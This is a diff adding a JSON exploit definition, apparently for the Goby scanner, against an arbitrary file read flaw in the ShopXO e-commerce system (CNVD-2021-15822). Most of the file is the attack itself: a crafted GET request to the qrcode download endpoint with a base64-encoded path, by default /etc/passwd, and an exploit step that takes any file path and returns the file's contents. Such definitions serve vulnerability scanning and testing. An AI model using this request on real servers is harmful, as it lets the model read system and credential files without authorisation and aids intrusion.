@@ -1,0 +1,88 @@
+{
+      "Name": "ShopXO Fileread CNVD-2021-15822",
+      "Level": "1",
+      "Tags": [
+            "fileread"
+      ],
+      "GobyQuery": "title=\"ShopXO\"",
+      "Description": "ShopXO is an open source enterprise-level open source e-commerce system.",
+      "Product": "ShopXO",
+      "Homepage": "https://www.shopxo.net/",
+      "Author": "",
+      "Impact": "ShopXO has an arbitrary file read vulnerability, which can be exploited by attackers to obtain sensitive information.",
+      "Recommendation": "",
+      "References": [
+            "https://www.cnvd.org.cn/flaw/show/CNVD-2021-15822",
+            "https://mp.weixin.qq.com/s/69cDWCDoVXRhehqaHPgYog"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "Cmd",
+                  "Type": "input",
+                  "Value": "L2V0Yy9wYXNzd2Q="
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q=",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "root",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/public/index.php?s=/index/qrcode/download/url/{{{Cmd}}}",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "root",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|undefined|undefined"
+                  ]
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
